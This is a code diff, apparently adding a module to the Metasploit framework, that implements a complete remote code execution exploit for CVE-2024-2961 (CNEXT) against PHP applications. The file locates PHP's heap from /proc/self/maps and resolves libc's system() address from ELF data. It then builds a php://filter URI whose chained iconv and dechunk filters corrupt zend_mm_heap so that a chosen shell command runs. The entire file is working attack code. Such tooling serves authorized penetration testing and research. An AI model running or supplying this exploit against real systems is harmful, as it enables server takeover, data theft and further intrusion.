+++ lib/msf/core/exploit/remote/php/cnext.rb
@@ -1,0 +1,373 @@
+module Msf
+  class Exploit
+    class Remote
+        module PHP
+          module CNEXT
+            # CNEXT (CVE-2024-2961) constants
+            CNEXT_HEAP_SIZE = 2 * 1024 * 1024
+            CNEXT_BUG = "\xe5\x8a\x84".b # UTF-8 encoding of 劄 - triggers glibc iconv overflow
+            CNEXT_OFFSET_FREE_SLOT  = 0x20  # zend_mm_heap->free_slot offset (x86_64)
+            CNEXT_OFFSET_CUSTOM_HEAP = 0x168 # zend_mm_heap->custom_heap offset (x86_64)
+            CNEXT_CHUNK_SIZE = 0x100 # Default chunk size used in CNEXT heap manipulation 
+
+            # Parses /proc/self/maps content into structured memory region entries.
+            #
+            # @param maps_content [String] raw contents of /proc/self/maps
+            # @return [Array<Hash>] array of { start:, stop:, perms:, path:, size: }
+            def cnext_parse_proc_maps(maps_content)
+              pattern = /^([0-9a-f]+)-([0-9a-f]+)\s+([-rwxps]{4})\s+\S+\s+\S+\s+\S+\s*(.*)/
+              regions = []
+
+              maps_content.each_line do |line|
+                match = line.strip.match(pattern)
+                next unless match
+
+                start_addr = match[1].to_i(16)
+                stop_addr  = match[2].to_i(16)
+                path = match[4].strip
+                path = '' unless path.include?('/') || path.include?('[')
+
+                regions << {
+                  start: start_addr,
+                  stop: stop_addr,
+                  perms: match[3],
+                  path: path,
+                  size: stop_addr - start_addr
+                }
+              end
+
+              regions
+            end
+
+
+            # Finds the first memory region whose path contains any of the given names.
+            #
+            # @param regions [Array<Hash>] parsed memory regions
+            # @param names   [Array<String>] substrings to match against region paths
+            # @return [Hash, nil] matching region or nil
+            def cnext_find_region(regions, *names)
+              regions.find { |r| names.any? { |n| r[:path].include?(n) } }
+            end
+
+            # Locates PHP's main zend_mm_heap in the process memory map.
+            # Searches for anonymous RW regions >= 2MB aligned on 2MB boundary.
+            #
+            # @param regions [Array<Hash>] parsed memory regions
+            # @return [Integer, nil] heap address (base of zend_mm_heap)
+            def cnext_find_main_heap(regions)
+              candidates = regions.select do |r|
+                r[:perms] == 'rw-p' &&
+                  r[:size] >= CNEXT_HEAP_SIZE &&
+                  (r[:stop] & (CNEXT_HEAP_SIZE - 1)).zero? &&
+                  (r[:path].empty? || r[:path] == '[anon:zend_alloc]')
+              end
+              return nil if candidates.empty?
+
+              # Heap is at the bottom of the region
+              candidates.last[:stop] - CNEXT_HEAP_SIZE + 0x40
+            end
+
+            # Extracts the GNU Build ID from ELF binary data.
+            #
+            # @param elf_data [String] raw ELF binary data (may be partial)
+            # @return [String, nil] hex-encoded build ID, or nil
+            def cnext_extract_build_id(elf_data)
+              gnu_name = "GNU\x00".b
+              pos = 0
+
+              while (name_offset = elf_data.index(gnu_name, pos))
+                header_offset = name_offset - 12
+                if header_offset < 0
+                  pos = name_offset + 1
+                  next
+                end
+
+                n_namesz, n_descsz, n_type = elf_data[header_offset, 12].unpack('VVV') rescue nil
+                unless n_namesz
+                  pos = name_offset + 1
+                  next
+                end
+
+                if n_namesz == 4 && n_type == 3 # NT_GNU_BUILD_ID
+                  build_id_data = elf_data[name_offset + n_namesz, n_descsz]
+                  return build_id_data.unpack1('H*') if build_id_data
+                end
+
+                pos = name_offset + 1
+              end
+
+              nil
+            end
+
+            # Parses an ELF64 little-endian binary's .dynsym section to resolve symbols.
+            #
+            # @param elf_data     [String] full ELF binary data
+            # @param symbol_names [Array<String>] symbol names to look up
+            # @return [Hash{String => Integer}] symbol name to offset within ELF
+            def cnext_parse_elf_symbols(elf_data, *symbol_names)
+              return {} if elf_data.nil? || elf_data.length < 64
+              return {} unless elf_data[0, 4] == "\x7fELF"
+              return {} unless elf_data[4].ord == 2 && elf_data[5].ord == 1 # ELF64 LE
+
+              e_shoff     = elf_data[40, 8].unpack1('Q<')
+              e_shentsize = elf_data[58, 2].unpack1('v')
+              e_shnum     = elf_data[60, 2].unpack1('v')
+              e_shstrndx  = elf_data[62, 2].unpack1('v')
+
+              return {} if e_shoff.zero? || e_shnum.zero?
+              return {} if e_shoff + e_shnum * e_shentsize > elf_data.length
+
+              # Section header string table
+              shstrtab_hdr = elf_data[e_shoff + e_shstrndx * e_shentsize, e_shentsize]
+              shstrtab_off = shstrtab_hdr[24, 8].unpack1('Q<')
+              shstrtab_sz  = shstrtab_hdr[32, 8].unpack1('Q<')
+              shstrtab = elf_data[shstrtab_off, shstrtab_sz]
+
+              dynsym_hdr = dynstr_hdr = nil
+              e_shnum.times do |i|
+                sh = elf_data[e_shoff + i * e_shentsize, e_shentsize]
+                sh_name_idx = sh[0, 4].unpack1('V')
+                sh_type     = sh[4, 4].unpack1('V')
+                name = shstrtab[sh_name_idx..].to_s.split("\x00", 2).first
+
+                dynsym_hdr = sh if name == '.dynsym' && sh_type == 11
+                dynstr_hdr = sh if name == '.dynstr' && sh_type == 3
+              end
+              return {} unless dynsym_hdr && dynstr_hdr
+
+              dynsym_off = dynsym_hdr[24, 8].unpack1('Q<')
+              dynsym_sz  = dynsym_hdr[32, 8].unpack1('Q<')
+              dynsym_ent = dynsym_hdr[56, 8].unpack1('Q<')
+              dynsym_ent = 24 if dynsym_ent.zero?
+
+              dynstr_off = dynstr_hdr[24, 8].unpack1('Q<')
+              dynstr_sz  = dynstr_hdr[32, 8].unpack1('Q<')
+              dynstr = elf_data[dynstr_off, dynstr_sz]
+
+              results = {}
+              (dynsym_sz / dynsym_ent).times do |i|
+                sym = elf_data[dynsym_off + i * dynsym_ent, dynsym_ent]
+                st_name  = sym[0, 4].unpack1('V')
+                st_value = sym[8, 8].unpack1('Q<')
+                name = dynstr[st_name..].to_s.split("\x00", 2).first
+
+                results[name] = st_value if symbol_names.include?(name) && st_value != 0
+              end
+
+              results
+            end
+
+            # Resolves __libc_malloc, __libc_system, and __libc_realloc from libc ELF data.
+            #
+            # @param libc_data [String] full libc ELF binary
+            # @param libc_base [Integer] runtime base address of libc
+            # @return [Hash, nil] { malloc:, system:, realloc: } absolute addresses
+            def cnext_resolve_libc_offsets(libc_data, libc_base)
+              symbols = cnext_parse_elf_symbols(
+                libc_data,
+                '__libc_malloc', '__libc_system', '__libc_realloc'
+              )
+
+              missing = %w[__libc_malloc __libc_system __libc_realloc] - symbols.keys
+              return nil unless missing.empty?
+
+              {
+                malloc:  libc_base + symbols['__libc_malloc'],
+                system:  libc_base + symbols['__libc_system'],
+                realloc: libc_base + symbols['__libc_realloc']
+              }
+            end
+
+            # Wraps data in HTTP chunked transfer-encoding format. If size is given,
+            # the chunk header is zero-padded to make the total exactly `size` bytes.
+            #
+            # @param data [String] chunk body
+            # @param size [Integer, nil] target total size
+            # @return [String] chunked representation
+            def cnext_chunked_chunk(data, size = nil)
+              size = data.length + 8 if size.nil?
+              keep = data.length + 2 # two \n delimiters
+              hex_len = data.length.to_s(16).rjust(size - keep, '0')
+              "#{hex_len}\n".b + data + "\n".b
+            end
+
+            # Creates a 0x8000-byte bucket for use with the dechunk filter.
+            #
+            # @param data [String] payload data
+            # @return [String] compressed bucket
+            def cnext_compressed_bucket(data)
+              cnext_chunked_chunk(data, 0x8000)
+            end
+
+            # Emulates PHP's quoted-printable-encode: every byte becomes =XX.
+            #
+            # @param data [String] binary data
+            # @return [String] QP-encoded representation
+            def cnext_qpe(data)
+              data.bytes.map { |b| format('=%02X', b) }.join.b
+            end
+
+            # Packs 64-bit pointers through the CNEXT encoding pipeline
+            # (QP encode -> triple chunked -> compressed bucket).
+            #
+            # @param ptrs [Array<Integer>] 64-bit pointer values
+            # @param size [Integer, nil] expected total byte size
+            # @return [String] encoded pointer bucket
+            def cnext_ptr_bucket(*ptrs, size: nil)
+              if size
+                raise ArgumentError, "ptr count mismatch" unless ptrs.length * 8 == size
+              end
+
+              bucket = ptrs.pack('Q<*')
+              bucket = cnext_qpe(bucket)
+              bucket = cnext_chunked_chunk(bucket)
+              bucket = cnext_chunked_chunk(bucket)
+              bucket = cnext_chunked_chunk(bucket)
+              cnext_compressed_bucket(bucket)
+            end
+
+            # Compresses data for PHP's zlib.inflate filter (raw deflate, no header).
+            #
+            # @param data [String] data to compress
+            # @return [String] raw deflate data
+            def cnext_compress(data)
+              Zlib::Deflate.deflate(data, 9)[2..-5]
+            end
+
+            # Builds the complete CNEXT PHP filter chain URI that exploits
+            # CVE-2024-2961 to overwrite zend_mm_heap and achieve RCE.
+            #
+            # The exploit works in 5 steps:
+            #   Step 0: Decompress and dechunk to set up heap allocations
+            #   Step 1: Allocate chunks to reverse the freelist order
+            #   Step 2: Write a fake freelist pointer into a chunk
+            #   Step 3: Trigger iconv buffer overflow (UTF-8 -> ISO-2022-CN-EXT)
+            #   Step 4: Allocate at controlled address, overwrite zend_mm_heap
+            #           free_slot[] and custom_heap to redirect efree -> system()
+            #
+            # @param command    [String] shell command to execute
+            # @param heap_addr  [Integer] address of PHP's zend_mm_heap
+            # @param libc_addrs [Hash] { malloc:, system:, realloc: } absolute addresses
+            # @param pad_count  [Integer] padding chunk count (default 20)
+            # @return [String] the php://filter/... data: URI
+            def cnext_build_exploit_path(command, heap_addr, libc_addrs, pad_count = 20)
+              addr_emalloc  = libc_addrs[:malloc]
+              addr_efree    = libc_addrs[:system]  # efree -> system() for RCE
+              addr_erealloc = libc_addrs[:realloc]
+
+              addr_free_slot   = heap_addr + CNEXT_OFFSET_FREE_SLOT
+              addr_custom_heap = heap_addr + CNEXT_OFFSET_CUSTOM_HEAP
+              addr_fake_bin    = addr_free_slot - 0x10
+
+              cs = CNEXT_CHUNK_SIZE
+
+              # ── Pad: fill heap to ensure contiguous ordered allocations ──
+              pad_size = cs - 0x18
+              pad = ("\x00" * pad_size).b
+              pad = cnext_chunked_chunk(pad, pad.length + 6)
+              pad = cnext_chunked_chunk(pad, pad.length + 6)
+              pad = cnext_chunked_chunk(pad, pad.length + 6)
+              pad = cnext_compressed_bucket(pad)
+
+              # ── Step 1: Reverse freelist order ──
+              step1 = "\x00".b
+              step1 = cnext_chunked_chunk(step1)
+              step1 = cnext_chunked_chunk(step1)
+              step1 = cnext_chunked_chunk(step1, cs)
+              step1 = cnext_compressed_bucket(step1)
+
+              # ── Step 2: Place fake freelist pointer ──
+              step2_size = 0x48
+              step2 = ("\x00" * (step2_size + 8)).b
+              step2 = cnext_chunked_chunk(step2, cs)
+              step2 = cnext_chunked_chunk(step2)
+              step2 = cnext_compressed_bucket(step2)
+
+              # "0\n" prefix protects this chunk from ISO-2022-CN-EXT conversion
+              step2_write_ptr = "0\n".b.ljust(step2_size, "\x00".b) + [addr_fake_bin].pack('Q<')
+              step2_write_ptr = cnext_chunked_chunk(step2_write_ptr, cs)
+              step2_write_ptr = cnext_chunked_chunk(step2_write_ptr)
+              step2_write_ptr = cnext_compressed_bucket(step2_write_ptr)
+
+              # ── Step 3: Trigger iconv buffer overflow ──
+              step3 = ("\x00" * cs).b
+              step3 = cnext_chunked_chunk(step3)
+              step3 = cnext_chunked_chunk(step3)
+              step3 = cnext_chunked_chunk(step3)
+              step3 = cnext_compressed_bucket(step3)
+
+              step3_overflow = ("\x00" * (cs - CNEXT_BUG.length) + CNEXT_BUG).b
+              step3_overflow = cnext_chunked_chunk(step3_overflow)
+              step3_overflow = cnext_chunked_chunk(step3_overflow)
+              step3_overflow = cnext_chunked_chunk(step3_overflow)
+              step3_overflow = cnext_compressed_bucket(step3_overflow)
+
+              # ── Step 4: Overwrite zend_mm_heap ──
+              step4 = ("=00" + "\x00" * (cs - 1)).b
+              step4 = cnext_chunked_chunk(step4)
+              step4 = cnext_chunked_chunk(step4)
+              step4 = cnext_chunked_chunk(step4)
+              step4 = cnext_compressed_bucket(step4)
+
+              # Overwrite free_slot[] - allocated 0x10 before data, hence two fillers
+              step4_pwn = cnext_ptr_bucket(
+                0x200000, 0,             # filler (0x10 before actual free_slot)
+                0, 0,                    # free_slot[0], free_slot[1]
+                addr_custom_heap,        # free_slot[2] -> next alloc lands at custom_heap
+                0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+                heap_addr,               # free_slot[17] (offset 0x140)
+                0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+                size: cs
+              )
+
+              # Overwrite custom_heap function pointers
+              step4_custom_heap = cnext_ptr_bucket(
+                addr_emalloc, addr_efree, addr_erealloc,
+                size: 0x18
+              )
+
+              # Command string + use_custom_heap activation
+              step4_uch_size = 0x140
+              cmd_str = "kill -9 $PPID; #{command}\x00".b
+              raise ArgumentError, "Command too long (#{cmd_str.length} > #{step4_uch_size})" if cmd_str.length > step4_uch_size
+
+              cmd_str = cmd_str.ljust(step4_uch_size, "\x00".b)
+              step4_uch = cnext_qpe(cmd_str)
+              step4_uch = cnext_chunked_chunk(step4_uch)
+              step4_uch = cnext_chunked_chunk(step4_uch)
+              step4_uch = cnext_chunked_chunk(step4_uch)
+              step4_uch = cnext_compressed_bucket(step4_uch)
+
+              # ── Assemble all pages ──
+              pages = ''.b
+              pages << step4 * 3
+              pages << step4_pwn
+              pages << step4_custom_heap
+              pages << step4_uch
+              pages << step3_overflow
+              pages << pad * pad_count
+              pages << step1 * 3
+              pages << step2_write_ptr
+              pages << step2 * 2
+
+              # Double-compress and encode as data: URI
+              resource = cnext_compress(cnext_compress(pages))
+              resource_b64 = Rex::Text.encode_base64(resource)
+
+              filters = [
+                'zlib.inflate',
+                'zlib.inflate',
+                'dechunk', 'convert.iconv.L1.L1',                   # Step 0
+                'dechunk', 'convert.iconv.L1.L1',                   # Step 1
+                'dechunk', 'convert.iconv.L1.L1',                   # Step 2
+                'dechunk', 'convert.iconv.UTF-8.ISO-2022-CN-EXT',   # Step 3
+                'convert.quoted-printable-decode', 'convert.iconv.L1.L1' # Step 4
+              ]
+
+              "php://filter/read=#{filters.join('|')}/resource=data:text/plain;base64,#{resource_b64}"
+            end
+          end
+        end
+    end
+  end
+end
